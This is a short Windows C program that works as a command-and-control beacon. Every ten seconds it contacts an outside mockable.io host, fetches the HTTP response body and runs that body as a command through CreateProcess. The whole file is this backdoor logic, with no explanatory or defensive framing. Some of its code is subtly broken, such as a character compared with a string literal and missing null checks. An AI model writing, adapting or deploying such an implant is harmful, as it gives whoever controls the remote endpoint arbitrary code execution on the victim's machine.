#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

int main()
{
	for (;;)
	{
		Sleep(10000);

		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
			continue;

		SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		struct hostent *host = gethostbyname("demo2350894.mockable.io");

		SOCKADDR_IN SockAddr;
		SockAddr.sin_port = htons(80);
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
		if (connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0)
			continue;
		
		const char *request = "GET /beacon1 HTTP/1.1\r\nHost: demo2350894.mockable.io\r\nConnection: close\r\n\r\n";
		send(Socket, request, strlen(request), 0);

		char buffer[10000];
		memset(buffer, 0, sizeof(buffer));
		recv(Socket, buffer, 10000, 0);
		const char *body = strstr(buffer, "\r\n\r\n") + 4;

		if (body[0] != "0")
		{
			STARTUPINFO startup_info;
			PROCESS_INFORMATION processo_info;
			memset(&startup_info, 0, sizeof(startup_info));
			startup_info.cb = sizeof(startup_info);
			CreateProcess(NULL, body, NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &processo_info);
		}

		closesocket(Socket);
		WSACleanup();
	}
}
